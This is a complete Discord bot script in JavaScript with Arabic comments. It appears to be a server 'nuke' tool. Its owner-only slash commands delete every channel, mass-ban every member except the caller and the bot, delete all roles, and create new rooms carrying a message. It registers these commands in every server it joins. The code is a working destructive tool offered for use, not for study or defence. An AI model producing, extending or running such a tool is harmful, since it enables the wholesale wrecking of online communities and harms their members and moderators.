const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, ChannelType, REST, Routes } = require('discord.js');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const OWNER_ID = '1452136095788564614'; // ID المالك فقط

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
    ]
});

// ===== تسجيل الأوامر =====
const commands = [
    new SlashCommandBuilder()
        .setName('delete-rooms')
        .setDescription('حذف جميع الروومات في السيرفر')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('add-room')
        .setDescription('إضافة روم جديد')
        .addStringOption(option =>
            option.setName('name')
                .setDescription('اسم الروم')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('message')
                .setDescription('الرسالة التي تُرسل في الروم')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('ban')
        .setDescription('باند عضو من السيرفر')
        .addUserOption(option =>
            option.setName('user')
                .setDescription('العضو المراد بانه')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('days')
                .setDescription('عدد أيام حذف الرسائل (0-7)')
                .setMinValue(0)
                .setMaxValue(7)
                .setRequired(false))
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الباند')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers),

    new SlashCommandBuilder()
        .setName('mass-ban')
        .setDescription('باند جميع الأعضاء في السيرفر')
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الباند (اختياري)')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

    new SlashCommandBuilder()
        .setName('delete-roles')
        .setDescription('حذف جميع الرولات في السيرفر')
        .addStringOption(option =>
            option.setName('reason')
                .setDescription('سبب الحذف (اختياري)')
                .setRequired(false))
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
].map(command => command.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

async function registerCommands(guildId) {
    try {
        console.log('جاري تسجيل الأوامر...');
        await rest.put(
            Routes.applicationGuildCommands(CLIENT_ID, guildId),
            { body: commands }
        );
        console.log('تم تسجيل الأوامر بنجاح!');
    } catch (error) {
        console.error('خطأ في تسجيل الأوامر:', error);
    }
}

// ===== البوت جاهز =====
client.once('ready', async () => {
    console.log(`✅ البوت شغال: ${client.user.tag}`);
    for (const guild of client.guilds.cache.values()) {
        await registerCommands(guild.id);
    }
});

// ===== معالجة الأوامر =====
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    // التحقق من المالك
    if (interaction.user.id !== OWNER_ID) {
        return interaction.reply({ content: '❌ هذا البوت خاص ولا يمكنك استخدامه.', ephemeral: true });
    }

    const { commandName } = interaction;

    // ===== حذف جميع الروومات =====
    if (commandName === 'delete-rooms') {
        await interaction.deferReply({ ephemeral: true });
        const channels = interaction.guild.channels.cache;
        let deleted = 0;
        for (const channel of channels.values()) {
            try {
                await channel.delete();
                deleted++;
            } catch (e) {}
        }
        await interaction.editReply(`✅ تم حذف **${deleted}** روم بنجاح.`);
    }

    // ===== إضافة روم =====
    else if (commandName === 'add-room') {
        await interaction.deferReply({ ephemeral: true });
        const name = interaction.options.getString('name');
        const message = interaction.options.getString('message');

        try {
            const channel = await interaction.guild.channels.create({
                name: name,
                type: ChannelType.GuildText,
            });

            if (message) {
                await channel.send(message);
            }

            await interaction.editReply(`✅ تم إنشاء الروم **${name}** بنجاح!`);
        } catch (e) {
            await interaction.editReply(`❌ فشل إنشاء الروم: ${e.message}`);
        }
    }

    // ===== باند =====
    else if (commandName === 'ban') {
        await interaction.deferReply({ ephemeral: true });
        const user = interaction.options.getUser('user');
        const days = interaction.options.getInteger('days') ?? 0;
        const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';

        try {
            await interaction.guild.members.ban(user, {
                deleteMessageDays: days,
                reason: reason,
            });
            await interaction.editReply(`✅ تم باند **${user.tag}** | السبب: ${reason} | حذف رسائل: ${days} يوم`);
        } catch (e) {
            await interaction.editReply(`❌ فشل الباند: ${e.message}`);
        }
    }

    // ===== باند جماعي =====
    else if (commandName === 'mass-ban') {
        await interaction.deferReply({ ephemeral: true });
        const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';

        try {
            const members = await interaction.guild.members.fetch();
            let banned = 0;
            for (const member of members.values()) {
                if (member.id === interaction.user.id) continue; // لا يبان نفسه
                if (member.id === client.user.id) continue; // لا يبان البوت
                try {
                    await member.ban({ reason });
                    banned++;
                } catch (e) {}
            }
            await interaction.editReply(`✅ تم باند **${banned}** عضو | السبب: ${reason}`);
        } catch (e) {
            await interaction.editReply(`❌ فشل الباند الجماعي: ${e.message}`);
        }
    }

    // ===== حذف جميع الرولات =====
    else if (commandName === 'delete-roles') {
        await interaction.deferReply({ ephemeral: true });
        const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
        const roles = interaction.guild.roles.cache.filter(r => !r.managed && r.name !== '@everyone');
        let deleted = 0;
        for (const role of roles.values()) {
            try {
                await role.delete(reason);
                deleted++;
            } catch (e) {}
        }
        await interaction.editReply(`✅ تم حذف **${deleted}** رول | السبب: ${reason}`);
    }
});

client.login(TOKEN);
